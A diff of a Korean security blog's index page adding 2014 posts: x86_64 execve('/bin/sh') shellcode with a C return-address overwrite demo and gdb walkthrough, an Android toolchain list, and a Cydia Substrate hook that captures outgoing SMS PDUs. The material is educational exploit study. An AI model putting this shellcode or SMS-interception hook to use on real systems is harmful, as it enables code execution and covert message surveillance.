@@ -9,8 +9,7 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="
-">
+  <meta name="description" content="callee 스택을 파괴하는 예제를 짜보았다. callee stackframe 에서 return address 를 _shellcode 의 어드레스로 바꿔서 retq 가 실행될때 저기로 튀도록 한다. char *_shellcode = "" "\x48\x31\xd2 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -66,6 +65,500 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/09/linux-x86-64-shellcode-2/">Linux X86_64 Shellcode 2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-09T15:32:12+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:32 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>callee 스택을 파괴하는 예제를 짜보았다.</p>
+
+<p>callee stackframe 에서 return address 를 <code>_shellcode</code> 의 어드레스로 바꿔서 <code>retq</code> 가 실행될때 저기로 튀도록 한다.</p>
+
+<pre><code>char *_shellcode = ""
+    "\x48\x31\xd2"      /* xor rdx,rdx */
+    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  /* mov qword rbx, '//bin/sh' */
+    "\x48\xc1\xeb\x08"  /* shr rbx,0x8 */
+    "\x53"              /* push rbx */
+    "\x48\x89\xe7"      /* mov rdi,rsp */
+    "\x48\x31\xc0"      /* xor rax,rax */
+    "\x50"              /* push rax */
+    "\x57"              /* push rdi */
+    "\x48\x89\xe6"      /* mov rsi,rsp */
+    "\xb0\x3b"          /* mov al,0x3b */
+    "\x0f\x05" ;        /* syscall */
+
+void explode() {
+    long *ret;
+    ret = (long *)&amp;ret;
+#if 1
+    ret++; // now points saved %rbp
+    ret++; // now points return address
+#else
+    __asm__(
+    "add $16,%rax\n\t"
+    "mov %rax, -0x8(%rbp)\n\t"
+    );
+#endif
+    *ret = _shellcode;
+}
+
+main()
+{
+    explode();
+}
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/08/linux-x86-64-shellcode/">Linux X86_64 Shellcode</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-08T15:49:47+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:49 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://www.exploit-db.com/exploits/13691">Linux x86_64 shellcode</a></p>
+
+<pre><code>section .text
+    global _start
+_start:
+    xor rdx,rdx
+    mov qword rbx, '//bin/sh'
+    shr rbx,0x8
+    push rbx
+    mov rdi,rsp
+    xor rax,rax
+    push rax
+    push rdi
+    mov rsi,rsp
+    mov al,0x3b
+    syscall
+
+int main(void)
+{
+    //void (*p)();
+    char *shellcode = ""
+        "\x48\x31\xd2"
+        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+        "\x48\xc1\xeb\x08"
+        "\x53"
+        "\x48\x89\xe7"  /* mov rdi,rsp */
+        "\x48\x31\xc0"  /* xor rax,rax */
+        "\x50"          /* push rax */
+        "\x57"
+        "\x48\x89\xe6"
+        "\xb0\x3b"
+        "\x0f\x05" ;
+
+    //p = (void(*)()) shellcode;
+    //(*p)();
+    (*(void(*)())shellcode)()
+}
+
+$ gcc -g a.c
+$ gdb a.out
+(gdb) break 18
+Breakpoint 1 at 0x4004c4: file a.c, line 18.
+(gdb) run
+Starting program: /home/z/shell/a.out
+warning: no loadable section found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, main() at a.c:18
+18          (*(void(*)())shellcode)();
+(gdb) disassemble
+Dump of assembler code for function main:
+   0x00000000004004b4 &lt;+0&gt;:     push   %rbp
+   0x00000000004004b5 &lt;+1&gt;:     mov    %rsp,%rbp
+   0x00000000004004b8 &lt;+4&gt;:     sub    $0x10,%rsp
+   0x00000000004004bc &lt;+8&gt;:     movq   $0x4005d0,-0x8(%rbp)
+=&gt; 0x00000000004004c4 &lt;+16&gt;:    mov    -0x8(%rbp),%rdx
+   0x00000000004004c8 &lt;+20&gt;:    mov    $0x0,%eax
+   0x00000000004004cd &lt;+25&gt;:    callq  *%rdx
+   0x00000000004004cf &lt;+27&gt;:    leaveq
+   0x00000000004004d0 &lt;+28&gt;:    retq
+End of assembler dump.
+(gdb) x $rbp-0x8
+0x7fffffffe038: 0x004005d0
+</code></pre>
+
+<p>0x004005d0 부터 shellcode 가 들어있는 것을 확인</p>
+
+<p><code>movabs $0x68732f6e69622f2f,%rbx</code> 로 <code>//bin/sh</code> 을 <code>%rbx</code> 에 집어넣고,
+, 오른쪽으로 8 bit shift 해서,
+<code>/bin/sh\x00</code> 을 만든다.</p>
+
+<p>그리고, 이를 push 해서, 메모리에</p>
+
+<pre><code>00 NULL  &lt;-- High
+68 'h'
+73 's'
+2f '/'
+6e 'n'
+69 'i'
+62 'b'
+2f '/'   &lt;-- Low (%rsp)
+</code></pre>
+
+<p>를 만든다.</p>
+
+<p><a href="https://filippo.io/linux-syscall-table">Searchable Linux Syscall Table for x86 and x86_64</a> 에서 64-bit 를 참조.</p>
+
+<pre><code>Instruction: `syscall`
+Return value found in: `%rax`
+rax: system call number
+rdi: name 
+rsi: argv 
+rdx: envp
+</code></pre>
+
+<p><code>0x3b</code> 는 execve 로 <code>linux/fs/exec.c</code> 에 구현되어있다. <code>syscall</code> 인터페이스는 <code>arch/x86_64/kernel/entry.S</code> 를 보면 된다.</p>
+
+<pre><code>/*
+ * execve(). This function needs to use IRET, not SYSRET, to set up all state properly.
+ *
+ * C extern interface:
+ *       extern long execve(char *name, char **argv, char **envp)
+ *
+ * asm input arguments:
+ *      rdi: name, rsi: argv, rdx: envp
+ *
+ * We want to fallback into:
+ *      extern long sys_execve(char *name, char **argv, char **envp, struct pt_regs regs)
+ *
+ * do_sys_execve asm fallback arguments:
+ *      rdi: name, rsi: argv, rdx: envp, fake frame on the stack
+ */
+ENTRY(execve)
+        FAKE_STACK_FRAME $0
+        SAVE_ALL
+        call sys_execve
+        movq %rax, RAX(%rsp)
+        RESTORE_REST
+        testq %rax,%rax
+        je int_ret_from_sys_call
+        RESTORE_ARGS
+        UNFAKE_STACK_FRAME
+        ret
+</code></pre>
+
+<p><code>arch/x86/kernel/process_64.c</code> 에 sys_execve() 가 있고, 이게</p>
+
+<pre><code>/*
+ * sys_execve() executes a new program.
+ */
+asmlinkage
+long sys_execve(const char __user *name, const char __user *const __user *argv, const char __user *const __user *envp)
+</code></pre>
+
+<p><code>/fs/exec.c</code> 에 있는 <code>do_execve()</code> 를 호출한다. <a href="http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c">fs/exec.c</a></p>
+
+<pre><code>/*
+ * linux/fs/exec.c
+ */
+...
+int do_execve(struct filename *filename,
+        const char __user *const __user *__argv,
+        const char __user *const __user *__envp)
+{
+    struct user_arg_ptr argv = { .ptr.native = __argv };
+    struct user_arg_ptr envp = { .ptr.native = __envp };
+    return do_execve_common(filename, argv, envp);
+}
+</code></pre>
+
+<p>이제 다시 shellcode 를 disassemble 해본다.</p>
+
+<pre><code>Instruction: `syscall`
+Return value found in: `%rax`
+rax: system call number
+rdi: name 
+rsi: argv 
+rdx: envp
+</code></pre>
+
+<p><code>%rdx</code> 를 0 으로 만들었다.</p>
+
+<pre><code>=&gt; 0x00000000004005d0:  xor    %rdx,%rdx
+</code></pre>
+
+<p>이 세 인스트럭션으로 메모리에 <code>/bin/sh\x00</code> 을 깔았다.</p>
+
+<pre><code>   0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
+   0x00000000004005dd:  shr    $0x8,%rbx
+   0x00000000004005e1:  push   %rbx
+</code></pre>
+
+<p>이제 이 메모리 주소를 <code>%rdi</code> 에 셋업한다. <code>name</code> 이 된다. <code>do_execve(name,...)</code></p>
+
+<pre><code>   0x00000000004005e2:  mov    %rsp,%rdi
+</code></pre>
+
+<p>이제 <code>%rsi</code> 에 argv 를 셋업한다. 이해가 안가는 곳은 <code>push %rax</code> 이다. 항상 0 이 될 수 있을까? 이걸 수정해서 새버전을 만들었다. <code>xor %rax,%rax</code> 를 <code>push %rax</code> 전에 넣으면 된다.</p>
+
+<pre><code>   0x00000000004005e5:  push   %rax  ; argv[1] : NULL pointer
+   0x00000000004005e6:  push   %rdi  ; argv[0] : pointer to '/bin/sh\0'
+   0x00000000004005e7:  mov    %rsp,%rsi ; %rsi points argv[0]
+</code></pre>
+
+<p>이제 <code>%rdx (envp)</code> 는 NULL, <code>%rsi</code> 는 argv[0], <code>%rdi</code> 는 filename 이 셋업되었다.</p>
+
+<p><code>%ax</code> 에 <code>execve</code> 를 넣고 syscall 을 수행한다.</p>
+
+<pre><code>(gdb) x 0x004005d0
+0x4005d0:       0x48d23148
+(gdb) stepi
+...
+(gdb) stepi
+(gdb) disassemble $rdx,+30
+Dump of assembler code from 0x4005d0 to 0x4005ee:
+=&gt; 0x00000000004005d0:  xor    %rdx,%rdx
+   0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
+   0x00000000004005dd:  shr    $0x8,%rbx
+   0x00000000004005e1:  push   %rbx
+   0x00000000004005e2:  mov    %rsp,%rdi
+   0x00000000004005e5:  push   %rax
+   0x00000000004005e6:  push   %rdi
+   0x00000000004005e7:  mov    %rsp,%rsi
+   0x00000000004005ea:  mov    $0x3b,%al
+   0x00000000004005ec:  syscall
+End of assembler dump.
+(gdb)
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/07/android-toolchain/">Android Toolchain</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-07T09:13:52+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:13 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Android Toolchain</h4>
+
+<p>from the book, &ldquo;Android Hacker&rsquo;s Handbook&rdquo;</p>
+
+<ul>
+<li>Debootstrap</li>
+<li>Linaro</li>
+<li>RVDS - ARM&rsquo;s official compiler toolchain is commercial but evaluation copies are available.</li>
+<li>Sourcery - Formerly Sourcery G++, Mentor Graphics&rsquo;s toolchain is available in evaluation, commercial, and Lite editions.</li>
+<li>Android NDK</li>
+<li>AOSP Prebuilt - The Android Open Source Project repository includes a prebuilt toolchain that is used to build AOSP firmware images.</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/03/substrate-for-android/">Substrate for Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-03T10:40:38+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:40 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Tools</h4>
+
+<ul>
+<li><a href="http://repo.xposed.info">Xposed Framework</a></li>
+<li><a href="http://www.cydiasubstrate.com">Cydia Substrate</a></li>
+<li><a href="http://www.cycript.org">Cycript</a></li>
+<li><a href="https://github.com/crmulliner/">ddi/adbi</a></li>
+<li><a href="http://www.frida.re">Frida</a></li>
+</ul>
+
+
+<h4>References</h4>
+
+<ul>
+<li><a href="https://github.com/Fuzion24/JustTrustMe">JustTrustMe: SSL Pinning kill switch</a></li>
+<li><a href="https://github.com/M66B/XPrivacy">XPrivacy</a></li>
+<li><a href="https://github.com/iSECPartners/Introspy-iOS">iSECPartners Introspy-iOS </a></li>
+</ul>
+
+
+<h4>Cydia Substrate</h4>
+
+<p>우선 Violet example. Substrate 를 깔고, violet.apk 를 설치하면 일부 시스템 메시지들이 색이 violet 으로 바뀐다. Build 가 잘 안되면, SDK 폴더 밑에 있는 <code>saurikit/cydia_substrate/substrate-api.jar</code> 화일을 프로젝트 폴더로 카피.</p>
+
+<h4>AndroidManifest.xml</h4>
+
+<pre><code>&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;
+&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.saurik.android.violetexample"&gt;
+    &lt;application android:label="@string/app_name"&gt;
+        &lt;meta-data android:name="com.saurik.substrate.main" android:value=".Main"/&gt;
+    &lt;/application&gt;
+    &lt;uses-permission android:name="cydia.permission.SUBSTRATE"/&gt;
+&lt;/manifest&gt;
+</code></pre>
+
+<h4>Main.java</h4>
+
+<pre><code>package com.saurik.android.violetexample;
+import android.util.Log;
+import java.lang.reflect.Method;
+import android.content.res.Resources;
+import com.saurik.substrate.MS;
+import com.saurik.substrate.MS.ClassLoadHook;
+import com.saurik.substrate.MS.MethodAlteration;
+
+public class Main {
+    public static void initialize() {
+        Log.d("HOOK", "hook initialized");
+
+        MS.hookClassLoad("android.content.res.Resources", new ClassLoadHook() {
+            public void classLoaded(Class Resources) {
+                try {
+                    MS.hookMethod(Resources, Resources.getDeclaredMethod("getColor", new Class[]{Integer.TYPE}),
+                        new MethodAlteration&lt;Resources, Integer&gt;() {
+                            public Integer invoked(Resources resources, Object... args) throws Throwable {
+                                return Integer.valueOf((((Integer) invoke(resources, args)).intValue() &amp; 
+                                    ~0x0000ff00) | 0x00ff0000);
+                            }
+                        });
+                } catch (NoSuchMethodException e) {
+                }
+            }
+        });
+    }
+}
+</code></pre>
+
+<h4>com.android.internal.telephony.gsm.SmsMessage</h4>
+
+<p>이제 pdu 를 캡쳐해보자.</p>
+
+<pre><code>public class Main {
+    public static void initialize() {
+        MS.hookClassLoad("com.android.internal.telephony.gsm.SmsMessage", new MS.ClassLoadHook() {
+            public void classLoaded(Class&lt;?&gt; smsMessage) {
+                Method getSubmitPdu;
+                try {
+                    getSubmitPdu = smsMessage.getMethod("getSubmitPdu",
+                        String.class,
+                        String.class,
+                        String.class,
+                        Boolean.TYPE,
+                        byte[].class,
+                        Integer.class,
+                        Integer.class,
+                        Integer.class,
+                        Integer.class
+                        );
+                } catch (NoSuchMethodException e) { getSubmitPdu = null; }
+                if (getSubmitPdu != null) {
+                    final MS.MethodPointer old = new MS.MethodPointer();
+                    MS.hookMethod(smsMessage, getSubmitPdu, new MS.MethodHook() {
+                        public Object invoked(Object smsMessage, Object... args) throws Throwable {
+                            Object submitPdu;
+                            submitPdu = old.invoke(smsMessage, args);
+                            try {
+                                Field field;
+                                field = submitPdu.getClass().getSuperclass().getDeclaredField("encodedMessage");
+                                field.setAccessible(true);
+                                if (field.getType() == byte[].class) {
+                                    Object val = field.get(submitPdu);
+                                    Log.d("Substrate", "pdu: " + this.bytesToHex((byte []) val));
+                                }
+                            } catch (Exception e) {
+                                Log.e("Substrate", "Error in Hook_getSubmitPdu. " + e.toString());
+                            }
+                            return submitPdu;
+                        }
+                    }, old);
+                }
+            } 
+        });
+    }
+}
+</code></pre>
+
+<p>추가로, pdu 를 교체하는 것도 가능하다.</p>
+
+<h5>SELinux</h5>
+
+<ul>
+<li><a href="http://forum.xda-developers.com/showthread.php?t=2466101&amp;page=3">Saurik&rsquo;s post</a></li>
+<li><a href="http://forum.xda-developers.com/showthread.php?t=2524485">SELinuxModeChanger</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -474,147 +967,6 @@ m2.invoke(sm, null, pdu, null, null, false, false);
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/08/20/cellular-exploitation/">Cellular Exploitation</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-08-20T11:04:36+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:04 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Ralph-Philipp Weinmann 의 <a href="https://www.usenix.org/system/files/conference/woot12/woot12-final24.pdf">Baseband Attacks: Remote Exploitation of Memory Corruptions in Celluar Protocol Stacks</a> 를 정리한다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/08/20/talking-to-the-modem-with-at-commands/">Talking to the Modem With at Commands</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-08-20T10:58:54+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:58 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><a href="http://forum.xda-developers.com/galaxy-s2/help/how-to-talk-to-modem-commands-t1471241">Galaxy S II / How to talk to the Modem with AT commands</a></p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/08/18/arm-exploitation-with-qemu/">ARM Exploitation With QEMU</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-08-18T11:41:27+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:41 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Stephen A. Ridley 의 30th Chaos Communication Congress 에서의 발표 <a href="http://www.youtube.com/watch?v=frUvlhO8o8A">Hardware Attacks, Advanced ARM Exploitation, and Android Hacking</a></p>
-
-<h4>ARM Basic Stack Overflows</h4>
-
-<h4>ARM Stack Overflows with Return-To-LibC</h4>
-
-<h4>ARM Stack Overflows with &ldquo;No Execute Stack&rdquo;</h4>
-
-<h4>ARM Heap Overflows</h4>
-
-<h4>ARM Heap Overflows with &ldquo;No Execute&rdquo; protection</h4>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2014/08/18/code-reuse-techiniques/">Code-Reuse Techiniques</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2014-08-18T11:37:40+09:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>11:37 am</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Dino A. Dai Zovi 의 Memory Corruption, Exploitation, and You 를 읽다가 정리해본다.</p>
-
-<p><a href="http://trailofbits.files.wordpress.com/2010/11/owasp_201011.pdf">Memory Corruption, Exploitation, and You</a></p>
-
-<ul>
-<li>Return-To-Libc (Solar Designer, 1997) - Return into functions in Libc</li>
-<li>Borrowed Code Chunks (Krahmer, 2005) - Link returns to single-instructions</li>
-<li>Return-oriented Programming (Shacham, 2007) - Turing complete w/ compiler for C-like language</li>
-</ul>
-
-
-<h4>Return-To-Libc</h4>
-
-<h4>Borrowed Code Chunks</h4>
-
-<h4>Return-oriented Programming</h4>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/14">&larr; Older</a>
@@ -632,23 +984,23 @@ m2.invoke(sm, null, pdu, null, null, false, false);
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/plaidctf-ctf-2015-plaiddb/">PlaidCTF CTF 2015: PlaidDB</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2016/06/14/hitcon-ctf-2014-unexploitable-heap-overflow/">Hitcon Ctf 2014 Unexploitable Heap Overflow</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/control-flow-enforcement-technology-preview/">Control-flow Enforcement Technology Preview</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/cve-2016-2468/">CVE-2016-2468</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/05/03/security-analysis-of-emerging-smart-home-applications/">Security Analysis of Emerging Smart Home Applications</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/04/26/rsa-sample-number/">RSA Sample Number</a>
       </li>
     
   </ul>
